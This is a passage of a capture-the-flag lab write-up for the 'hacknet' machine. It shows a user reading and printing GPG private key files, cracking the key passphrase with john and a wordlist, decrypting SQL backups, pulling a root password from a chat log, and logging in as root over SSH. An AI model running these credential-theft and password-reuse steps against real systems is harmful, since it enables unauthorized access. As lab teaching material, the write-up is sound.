+lrwxrwxrwx 1 root  root     9 Jul  3  2024 .python_history -&gt; /dev/null</span></span></span></code></pre><div id="https://www.notion.so/2eb0b98a88f780808a75f0a140eef0b7" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Inside, there’s </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">private-keys-v1.d/</code></span><span class="SemanticString">, which contains several files.</span></span></p></div><pre id="https://www.notion.so/2d50b98a88f78000bcb5ef62137ae346" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>sandy@hacknet:~$</span></mark></span><span class="SemanticString"><span> ls -la .gnupg
+
+total 32
+drwx------ 4 sandy sandy 4096 Sep  5 11:33 .
+drwx------ 6 sandy sandy 4096 Sep 11 11:18 ..
+drwx------ 2 sandy sandy 4096 Sep  5 11:33 openpgp-revocs.d
+drwx------ 2 sandy sandy 4096 Sep  5 11:33 private-keys-v1.d
+-rw-r--r-- 1 sandy sandy  948 Sep  5 11:33 pubring.kbx
+-rw------- 1 sandy sandy   32 Sep  5 11:33 pubring.kbx~
+-rw------- 1 sandy sandy  600 Sep  5 11:33 random_seed
+-rw------- 1 sandy sandy 1280 Sep  5 11:33 trustdb.gpg
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>sandy@hacknet:~$</span></mark></span><span class="SemanticString"><span> ls -la .gnupg/private-keys-v1.d
+
+total 20
+drwx------ 2 sandy sandy 4096 Sep  5 11:33 .
+drwx------ 4 sandy sandy 4096 Sep  5 11:33 ..
+-rw------- 1 sandy sandy 1255 Sep  5 11:33 0646B1CF582AC499934D8503DCF066A6DCE4DFA9.key
+-rw------- 1 sandy sandy 2088 Sep  5 11:33 armored_key.asc
+-rw------- 1 sandy sandy 1255 Sep  5 11:33 EF995B85C8B33B9FC53695B9A3B597B325562F4F.key</span></span></span></code></pre><div id="https://www.notion.so/2d50b98a88f780e1989ef17b1339325f" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Two of which are protected private keys.</span></span></p></div><pre id="https://www.notion.so/2d50b98a88f780a0bc60c73e06987e26" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>sandy@hacknet:~/.gnupg/private-keys-v1.d$</span></mark></span><span class="SemanticString"><span> cat 0646B1CF582AC499934D8503DCF066A6DCE4DFA9.key
+
+Created: 20241229T202032
+Key: (protected-private-key (rsa (n #00EDFED38969BFACDCB65C63B0E99D350C
+ 656E6D336CAE0E23EE523D36D6B7601C9D67DBBC71B9FE45C30FB8712F6F87F27D91C8
+ BFC1FEEF891867FA0A3FE2FB132359DA62C8F18258A422A98995F3FD5EE13FD84C1F7C
+ C524F5B5B121F28E91FC66EA8E9CFE3A022CCEF9E2CF4E97A67369C593D17905D221CF
+ 1E23BAB4127FD5#)(e #010001#)(protected openpgp-s2k3-ocb-aes ((sha1
+  #5DDB23AC1FFA8390# &quot;117049344&quot;)#6D14AC53876650E78C5E967E#)#8094E4433E
+ B218E340F965D584881EA1537535A4A727FF117E23D1000424DBC9509D94B9E2365186
+ 82990B33E8C5B922AFFF83DE1382FBDAA8B610529C82EAD3E22EDE9EB479CCA35D250E
+ 2E2ABB8B077333BE707C82FC7BA347DD79A4934D411AB58A61EE346648DA2A06665004
+ FF6DA43A1D706BC5B30E6A960C1AC84FBC3F196656CC7CFBFD65F823138388600E09FC
+ A09E67ACD3086A07041504A398D8A50BC705243F601FA01E905BAA2921C9602CEF75AB
+ EEE67B3124104DAA44D50BF305ED7A3299206D7EBF59747D58AACD4837951DDA6594FF
+ 1AF403472DF56CF39CDD08510CE70E179F4F1069428ABEA4C2747547E0ABF632BCA572
+ C45DFC475E91983277B08A55F0471B306D61601EC0546DE8EC7053B4101A32F53F9CCF
+ 7F372511F1BDA639D98DFCB06036B9DF5B8C527E859593009C4463313269D2ED6329EE
+ E13AE3034F9B67E97531FD85C8A8E07C0BD9FE776E64F77E7AF42A4BADE8F80DA17963
+ 06C9E4F06CD9EA59AB65279E7D8C34795A14E316F5#)(protected-at
+  &quot;20241229T214648&quot;)))</span></span></span></code></pre><div id="https://www.notion.so/2eb0b98a88f78025ae40caae0b077a45" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">armored_key.asc</code></span><span class="SemanticString"> is a PGP private key block.</span></span></p></div><pre id="https://www.notion.so/2d50b98a88f780f38196ecdc7b876ffb" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>sandy@hacknet:~/.gnupg/private-keys-v1.d$</span></mark></span><span class="SemanticString"><span> cat armored_key.asc
+
+-----BEGIN PGP PRIVATE KEY BLOCK-----
+
+lQIGBGdxrxABBACuOrGzU2PoINX/6XsSWP9OZuFU67Bf6qhsjmQ5CcZ340oNlZfl
+LsXqEywJtXhjWzAd5Juo0LJT7fBWpU9ECG+MNU7y2Lm0JjALHkIwq4wkGHJcb5AO
+949lXlA6aC/+CuBm/vuLHtYrISON7LyUPAycmf8wKnE7nX9g4WY000k8ywARAQAB
+/gcDAoUP+2418AWL/9s1vSnZ9ABrtqXgH1gmjZbbfm0WWh2G9DJ2pKYamGVVijtn
+..SNIP..
+XB+hnBL3YBgEAKsNo9aR7rfIaBdXAI1lFWsfBDuV28mTo8RgoE40rg+U4a2vPJAt
+DZNUnvaugNdG2nNkX1b4U+fNJMR07GCAJIGVrQojqnSVCKYjI4Et7VtRIlOI7Bmr
+UWLDskLCqTD33o4VOV3IITVkQc9KktjhI74C7kZrOr7v07yuegmtzLi+
+=wR12
+-----END PGP PRIVATE KEY BLOCK-----</span></span></span></code></pre><div id="https://www.notion.so/2eb0b98a88f7803bb864d8d9d69e5177" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">It’s protected by a passphrase, which can be recovered by </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">john</code></span><span class="SemanticString">:</span></span></p></div><pre id="https://www.notion.so/2d50b98a88f7802eb172d02b60ef9e9f" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/hacknet]
+└─$</span></mark></span><span class="SemanticString"><span> gpg2john armored_key.asc &gt; hash.txt
+
+File armored_key.asc
+                                                                                                                                                                                                                                            
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/hacknet]
+└─$</span></mark></span><span class="SemanticString"><span> john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt 
+
+Using default input encoding: UTF-8
+Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
+Cost 1 (s2k-count) is 65011712 for all loaded hashes
+Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
+Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 7 for all loaded hashes
+Will run 16 OpenMP threads
+Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>sweetheart       (Sandy)     </span></mark></span><span class="SemanticString"><span>
+1g 0:00:00:01 DONE (2025-12-26 03:04) 0.7042g/s 304.2p/s 304.2c/s 304.2C/s gandako..nicole1
+Use the &quot;--show&quot; option to display all of the cracked passwords reliably
+Session completed.</span></span></span></code></pre><h3 id="https://www.notion.so/2d50b98a88f78088ab19ef935cae094a" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/2d50b98a88f78088ab19ef935cae094a"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">GPG Decrypt:</span></span></h3><div id="https://www.notion.so/2ec0b98a88f780919739fa118299d6e5" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">With the passphrase recovered, I’ll decrypt the database dump files found earlier.</span></span></p></div><pre id="https://www.notion.so/2d50b98a88f780b8aa58ce4076257ac9" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>sandy@hacknet:~$</span></mark></span><span class="SemanticString"><span> gpg -d --home /home/sandy/.gnupg/ /var/www/HackNet/backups/backup01.sql.gpg  &gt; backup01.sql
+
+gpg: encrypted with 1024-bit RSA key, ID FC53AFB0D6355F16, created 2024-12-29
+      &quot;Sandy (My key for backups) &lt;sandy@hacknet.htb&gt;&quot;
+
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>sandy@hacknet:~$</span></mark></span><span class="SemanticString"><span> gpg -d --home /home/sandy/.gnupg/ /var/www/HackNet/backups/backup02.sql.gpg  &gt; backup02.sql
+
+gpg: encrypted with 1024-bit RSA key, ID FC53AFB0D6355F16, created 2024-12-29
+      &quot;Sandy (My key for backups) &lt;sandy@hacknet.htb&gt;&quot;
+
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>sandy@hacknet:~$</span></mark></span><span class="SemanticString"><span> gpg -d --home /home/sandy/.gnupg/ /var/www/HackNet/backups/backup03.sql.gpg  &gt; backup03.sql
+
+gpg: keydb_search failed: No such file or directory
+gpg: encrypted with RSA key, ID FC53AFB0D6355F16
+gpg: decryption failed: No secret key</span></span></span></code></pre><div id="https://www.notion.so/2eb0b98a88f78051b55fc082f2a51cbf" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Only the first two decrypted successfully. In </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">backup02.sql</code></span><span class="SemanticString">, there’s a root password.</span></span></p></div><pre id="https://www.notion.so/2d50b98a88f78022a315e89752ae235b" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token punctuation">.</span><span class="token punctuation">.</span>SNIP<span class="token punctuation">.</span><span class="token punctuation">.</span>
+<span class="token keyword">LOCK</span> <span class="token keyword">TABLES</span> <span class="token identifier"><span class="token punctuation">`</span>SocialNetwork_socialmessage<span class="token punctuation">`</span></span> <span class="token keyword">WRITE</span><span class="token punctuation">;</span>
+<span class="token comment">/*!40000 ALTER TABLE `SocialNetwork_socialmessage` DISABLE KEYS */</span><span class="token punctuation">;</span>
+<span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> <span class="token identifier"><span class="token punctuation">`</span>SocialNetwork_socialmessage<span class="token punctuation">`</span></span> <span class="token keyword">VALUES</span>
+<span class="token punctuation">.</span><span class="token punctuation">.</span>SNIP<span class="token punctuation">.</span><span class="token punctuation">.</span>
+<span class="token punctuation">(</span><span class="token number">47</span><span class="token punctuation">,</span><span class="token string">'2024-12-29 20:29:36.987384'</span><span class="token punctuation">,</span><span class="token string">'Hey, can you share the MySQL root password with me? I need to make some changes to the database.'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+<span class="token punctuation">(</span><span class="token number">48</span><span class="token punctuation">,</span><span class="token string">'2024-12-29 20:29:55.938483'</span><span class="token punctuation">,</span><span class="token string">'The root password? What kind of changes are you planning?'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+<span class="token punctuation">(</span><span class="token number">49</span><span class="token punctuation">,</span><span class="token string">'2024-12-29 20:30:14.430878'</span><span class="token punctuation">,</span><span class="token string">'Just tweaking some schema settings for the new project. Won’t take long, I promise.'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">,</span><span class="token string">'2024-12-29 20:30:41.806921'</span><span class="token punctuation">,</span><span class="token string">'Alright. But be careful, okay? Here’s the password: h4ck3rs4re3veRywh3re99. Let me know when you’re done.'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+<span class="token punctuation">.</span><span class="token punctuation">.</span>SNIP<span class="token punctuation">.</span><span class="token punctuation">.</span></span></span></span></code></pre><div id="https://www.notion.so/2eb0b98a88f78064b1c4fb6c099930d3" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Reusing that for root login works.</span></span></p></div><pre id="https://www.notion.so/2d50b98a88f7807886f5d2304b82316a" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/hacknet]
+└─$</span></mark></span><span class="SemanticString"><span> ssh root@hacknet.htb 
+
+Warning: Permanently added &#x27;hacknet.htb&#x27; (ED25519) to the list of known hosts.
+root@hacknet.htb&#x27;s password: 
+Linux hacknet 6.1.0-38-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.147-1 (2025-08-02) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Thu Dec 25 12:13:46 2025 from 10.10.14.79
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>root@hacknet:~#</span></mark></span><span class="SemanticString"><span> id
+
+uid=0(root) gid=0(root) groups=0(root)</span></span></span></code></pre><h3 id="https://www.notion.so/2d50b98a88f78026aaecd2b72cbef5c1" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/2d50b98a88f78026aaecd2b72cbef5c1"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Root Flag:</span></span></h3><pre id="https://www.notion.so/2d50b98a88f780f196a7eb0e4757c521" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>root@hacknet:~#</span></mark></span><span class="SemanticString"><span> cat root.txt 
+
+606e0a8a************************</span></span></span></code></pre><div id="https://www.notion.so/2d40b98a88f7811aa5fbc6ec8b6de713" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/2d40b98a88f781ac87efc9c35dbd3c37" class="Divider"></div></article>
+  <footer class="Footer">
+  <div>&copy; C:\Users\ch3ng &gt;_ 2025</div>
+  <div>&centerdot;</div>
+  <div>Powered by <a href="https://github.com/dragonman225/notablog" target="_blank"
+      rel="noopener noreferrer">Notablog</a>.
+  </div>
+</footer>
+
+</body>
+
+</html>
